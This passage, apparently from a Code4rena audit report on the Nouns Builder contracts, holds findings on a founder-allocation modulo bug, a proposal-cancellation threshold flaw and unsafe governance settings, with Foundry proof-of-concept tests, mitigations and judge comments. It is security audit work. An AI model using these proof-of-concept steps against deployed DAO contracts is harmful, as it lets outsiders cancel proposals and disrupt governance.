tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalOwnership</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Alice&#39;s balance is wrong&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">), </span><span class=\"mtk7\">11</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Bob&#39;s balance is wrong&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Verifies it with the law of large numbers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMEP_M1_2</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">setUpMEP</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensToMint</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">123456</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// enough large to apply the law of large numbers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokensToMint</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Alice&#39;s percentage is wrong&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">, </span><span class=\"mtk7\">11</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Bob&#39;s percentage is wrong&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Replace the line 118 of <code>Token.sol</code> by <code>baseTokenId = (baseTokenId + schedule) % 100;</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269#issuecomment-1257268896\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a logical mistake / typo, founders will receive a lower allocation than expected.</p>\n<p>This is contingent on certain allocations being set and will cause a “loss of yield” to the founders estimated to the lost allocation.</p>\n<p>I believe the finding could be raised to High Severity due to the graveness of it, however, because it is contingent on specific inputs, I think Medium Severity to be appropriate</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269#issuecomment-1258518341\">tbtstl (Nouns Builder) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I actually think this one should be high severity – it’s important that these token ownership percentages end up consistent on a long enough time scale.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269#issuecomment-1261623943\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I appreciate the generosity of the sponsor, ultimately the bug can happen only if <code>(baseTokenId + schedule)</code> is greater than 100, which, because the schedule is X / 100, will not always happen, and the loss will not be total but only for the specific tokens for which the modulo is necessary.</p>\n<p>For those reasons (conditionality of bug due to admin input), I think Medium Severity to be more appropriate.</p>\n<p>I do recommend mitigation nonetheless.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-a-proposal-can-be-cancelled-by-anyone-if-the-proposal-has-exactly-proposalthreshold-votes\" style=\"position:relative;\"><a href=\"#m-05-a-proposal-can-be-cancelled-by-anyone-if-the-proposal-has-exactly-proposalthreshold-votes\" aria-label=\"m 05 a proposal can be cancelled by anyone if the proposal has exactly proposalthreshold votes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194\">[M-05] A proposal can be cancelled by anyone if the proposal has exactly proposalThreshold votes</a></h2>\n<p><em>Submitted by davidbrai, also found by cccz, Ch_301, Chom, datapunk, elad, GimelSec, pauliax, PwnPatrol, and rbserver</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363</a></p>\n<p>If the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.</p>\n<p>When creating a proposal the requirement is “Ensure the caller’s voting weight is greater than or equal to the threshold”.<br>\nWhen cancelling a proposal the check is:<br>\nif <code>getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold</code> then it the cancelling is not allowed. In effect, if the number of votes is lower than <em>or equal</em> to the proposalThreshold it can be cancelled.</p>\n<p>In the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The forge test below demonstrates the issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.15;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/console.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { NounsBuilderTest } from &quot;../utils/NounsBuilderTest.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { IManager } from &quot;../../src/manager/IManager.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { IGovernor } from &quot;../../src/governance/governor/IGovernor.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { GovernorTypesV1 } from &quot;../../src/governance/governor/types/GovernorTypesV1.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 internal constant AGAINST = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 internal constant FOR = 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 internal constant ABSTAIN = 2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 proposalThresholdBps = 100;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address internal voter1 = address(0x1234);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address internal randomUser = address(0x8888);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setUp() public virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super.setUp();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deployMock();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testCanCancelProposalIfExactThreshold() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // mint a few tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i; i &lt; 85; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vm.prank(address(auction));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            token.mint();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.totalSupply(), 100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // transfer one token to voter1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(address(auction));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.transferFrom(address(auction), voter1, 5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.balanceOf(voter1), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // make sure voter has enough votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(governor.proposalThreshold(), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.getVotes(voter1), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(block.timestamp + 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // propose</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(voter1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 proposalId = governor.propose(targets, values, calldatas, &quot;test&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Proposal created successfully</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Cancel proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(randomUser);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        governor.cancel(proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setMockGovParams() internal virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mockProposal()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        internal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        view</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        returns (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address[] memory targets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256[] memory values,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bytes[] memory calldatas</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        targets = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        values = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        calldatas = new bytes[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        targets[0] = address(auction);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        calldatas[0] = abi.encodeWithSignature(&quot;pause()&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the check in <code>cancel</code> to match the requirement in <code>propose</code>;<br>\nchange line 363 in Governor.sol to:<br>\n<code>if (msg.sender != proposal.proposer &#x26;&#x26; getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194#issuecomment-1257270340\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Because we know that a cancelled proposal cannot be repeated, and because the protocol is aiming at auctioning out NFTs that are unitary, rare, “small print” if you will, then 1 vote may be considered more heavily than in other situations. (e.g. 1 second is still just 1 second, but 1 token here could be 10s if not hundreds of thousands of dollars)</p>\n<p>Not only that, due to the <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L363\">following check</a>, the proposer must maintain the current balance above the threshold (instead of it being the balance at time of proposal).</p>\n<p>For those reasons, I think this is a medium severity finding.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194\">kulkarohan (Nouns Builder) confirmed, but disagreed with severity</a></strong></p>\n<hr>\n<h2 id=\"m-06-proposals-can-be-bricked-and-auctions-stalled-by-bad-settings\" style=\"position:relative;\"><a href=\"#m-06-proposals-can-be-bricked-and-auctions-stalled-by-bad-settings\" aria-label=\"m 06 proposals can be bricked and auctions stalled by bad settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482\">[M-06] Proposals can be bricked and Auctions stalled by bad settings</a></h2>\n<p><em>Submitted by chatch, also found by 0x4non, ak1, ayeslick, Chom, fatherOfBlocks, hyh, R2, rvierdiiev, scaraven, simon135, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L588\">Governor.sol#L588</a><br></p>\n<p>The protocol assumes founders and proposals will set sane settings. However there are some settings that if set incorrectly will block proposals from being created or succeeding and block auctions from completing.</p>\n<p>This vulnerability has a low likelihood of occurrence as the outcome is not in the interest of the community. However the possibility exists if there is some misunderstanding or miscalculation. If a bad setting is allowed the impact is high.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<h4 id=\"bricking-governance-proposals\" style=\"position:relative;\"><a href=\"#bricking-governance-proposals\" aria-label=\"bricking governance proposals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bricking governance proposals</h4>\n<p><strong>Governor settings.quorumThresholdBps > 10_000</strong></p>\n<p>If <code>quorumThresholdBps</code> is set above 10_000 then it would be impossible to get enough votes to succeed.</p>\n<p>Without being able to execute a proposal the setting itself could never be fixed.</p>\n<p><strong>Governor settings.proposalThresholdBps > 10_000</strong></p>\n<p>If <code>proposalThresholdBps</code> is set above 10_000 then it would be impossible to submit a proposal.</p>\n<p>Without being able to submit a proposal the setting itself could never be fixed.</p>\n<h4 id=\"stalling-a-governance-proposal\" style=\"position:relative;\"><a href=\"#stalling-a-governance-proposal\" aria-label=\"stalling a governance proposal permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stalling a governance proposal</h4>\n<p><strong>Treasury settings.delay</strong></p>\n<p>A very large value for <code>delay</code> would prevent a proposal from being executed.</p>\n<p>For example 1000 years easily fits into <code>delay</code> and would result in a 1000 year wait before being able to execute.</p>\n<p>A governance proposal could fix this property for future proposals but any proposal created with the large <code>delay</code> would remain stuck.</p>\n<h4 id=\"stalling-the-auction\" style=\"position:relative;\"><a href=\"#stalling-the-auction\" aria-label=\"stalling the auction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stalling the auction</h4>\n<p><strong>Auction settings.duration</strong></p>\n<p>The <code>duration</code> value is in seconds and any value up to type(uint40).max is permitted.</p>\n<p>That is <code>1099511627775</code> seconds which is > 48000 years.</p>\n<p>A large value like this would stop the auction from ever ending and thus stop new NFTs from being minted.</p>\n<p>A governance proposal could fix this setting but ideally a very large <code>duration</code> would be blocked.</p>\n<p><strong>Auction settings.timeBuffer</strong></p>\n<p>Similar to duration but applies to the auction endTime extention.</p>\n<p>So the auction could be extended a number of years for example.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 